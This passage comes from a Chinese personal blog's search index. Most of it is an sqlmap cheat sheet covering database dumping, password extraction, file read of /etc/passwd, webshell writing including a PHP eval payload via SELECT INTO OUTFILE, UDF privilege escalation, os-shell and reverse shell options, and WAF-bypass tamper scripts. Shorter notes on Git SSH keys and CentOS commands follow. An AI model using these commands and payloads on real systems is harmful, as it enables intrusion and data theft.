–version-all：使用所有的探测条件进行版本/系统探测 –version-trace:打印详细的版本扫描过程 脚本扫描 –script=:指定脚本名称 –script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数 –script-help=: 查看脚本帮助信息 –script-updatedb:更新脚本数据库 系统探测 -O:激活系统探测 –osscan-limit:只对开放端口的有效主机进行系统探测 –osscan-guess：推测系统信息 其他 -T:时间模板，越大速度越快 -6：使能IPV6探测 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -V：打印版本号 -v：增加输出的详细程度]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F519cc.html</url>
    <content type="text"><![CDATA[sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns #列出字段- –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 –privileges #查看权限 –is-dba #是否是数据库管理员 –roles #枚举数据库用户角色 –udf-inject #导入用户自定义函数（获取系统权限） –union-check #是否支持union 注入 –union-cols #union 查询表记录 –union-test #union 语句测试 –union-use #采用union 注入 –union-tech orderby #union配合order by –method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″) –cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “” #使用referer欺骗(–referer “http://www.baidu.com”) –user-agent “” #自定义user-agent –proxy “http://127.0.0.1:8118″ #代理注入 –string “” #指定关键词 –threads #采用多线程(–threads 3) –sql-shell #执行指定sql命令 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ ) –file-read #读取指定文件 –file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) –file-dest #要写入的文件绝对路径 –os-cmd=id #执行系统命令 –os-shell #系统交互shell –os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) –msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/) –os-smbrelay # –os-bof # –reg-read #读取win系统注册表 –priv-esc # –time-sec= #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入 –eta #盲注 1. 基础用法： ./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中 2. sqlmap post注入 在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.2cto.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 如下图，这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3. sqlmap cookies注入 sqlmap.py -u “http://127.0.0.1/base.php&quot; –cookies “id=1” –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础 上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”-p是指指定参数注入 4. sqlmap遇到url重写的注入 哪里存在注入就加上 号./sqlmap.py -u “http://www.cunlide.com/id1/1/id2/2” 5. sqlmap 编码绕waf注入在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py” sqlmap读文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-read “/etc/passwd” sqlmap写文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2 sqlmap分段脱裤 sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000其他基础： sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 信息获取 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” - –union-check #是否支持union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart–proxy”http://127.0.0.1:8118&quot; #代理注入 sqlmap -u “http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 ./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″“Show.asp” –cookie “id=9” –table –level 2–forms–data “data”–delay 0.5–safe-freq 25-v 3 –dbs –batch –tamper “base64encode.py”sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump-all -v 传统的sql语句写shell通过sql注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# dumpfile、file_put_contents outfile不能用了怎么办？select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;;可以 UDF提权https://www.cnblogs.com/milantgh/p/5444398.html outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。 写shell条件 文件名必须是绝对路径 用户必须有写文件权限 sqlmap写shell前提需要对目录具有写权限 1--os-cmd=&quot;net user&quot; 交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。 1--os-shell 写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell 关闭sqlmap文件就会被删除 常见数据库端口号123456789101112131415Oracle 默认1521SQL Server 默认1433Mysql默认330621 FTP 22 ssh23 telnet25 smtp109 110 pop2 pop3]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo日志]]></title>
    <url>%2Fnote%2F2019%2Fundefined02%2F1c91193.html</url>
    <content type="text"><![CDATA[2019.6.1Git 远程遇到了问题: Please make sure you have the correct access rights and the repository exists. 发现是ssh key有问题，连接不上服务器 首先是重新在git设置一下身份的名字和邮箱： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;your@email.com&quot; 注：要添加具体的yourname，your@email 删除.ssh文件夹（直接搜索该文件夹）下的known_hosts 在 git输入命令： $ ssh-keygen -t rsa -C &quot;your@email.com&quot; 然后会出现： Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制 登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key 在 git 中输入命令 ssh -T git@github.com 然后输入Yes回车，就会提示成功 之后就可以正常 hexo d -g 啦]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 笔记]]></title>
    <url>%2Fnote%2F2019%2Fundefined25%2F875db5e1.html</url>
    <content type="text"><![CDATA[CentOS 常用命令 shutdown -h now 关机 shutdown -h +3 三分钟后关机 halt poweroff init 0 shutdown -r now 重启 shutdown -r +3 三分钟重启 reboot init 6 cat 1.txt | tail - n +3001 | head -n 1000 截取文件中的3001到4000 grep o 1.txt 正常过滤 grep -v 1.txt 反向过滤 cat &gt;1.txt 清空文件内容 ll -d /data/www 查看权限 pkill -kill -t tty3 杀死用户进程 mkdir /media/cdrom mount /dev/sr0 /media/cdrom 挂载光盘 umount /media/cdrom 卸载 systemctl stop firewalld.service 关闭防火墙 setenforce 0 给外界权限 systemctl disable firewalld.service 永久关闭 systemctl enable firewalld.service 永久开启 vim /etc/rc.d/rc.local 设置开机启动为镜像添加开机自动挂载 echo &quot;mount /dev/sr0 /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local vim /etc/selinux/config ^vim^cat 把vim替换成cat继续执行 ls -al 看临时文件 CentOS7 目录文件 /etc/yum.repos.d/ yum源文件位置 /etc/rc.d/rc.local 开机启动文件 rm -f /var/run/yum.pid yum clean all 清空yum源缓存 /etc/nginx/conf.d/default.conf Nginx配置文件 vim /etc/my.cnf 去mysql密码要求 /usr/share/nginx/html/ Nginx主页文件位置 /etc/httpd/conf/httpd.conf Apache配置文件 /var/www/html/ Apache主页文件位置]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Who am I]]></title>
    <url>%2Fnote%2F2019%2Fundefined21%2Fe3eaa03c.html</url>
    <content type="text"><![CDATA[未来可期]]></content>
      <tags>
        <tag>Me</tag>
      </tags>
  </entry>
</search>
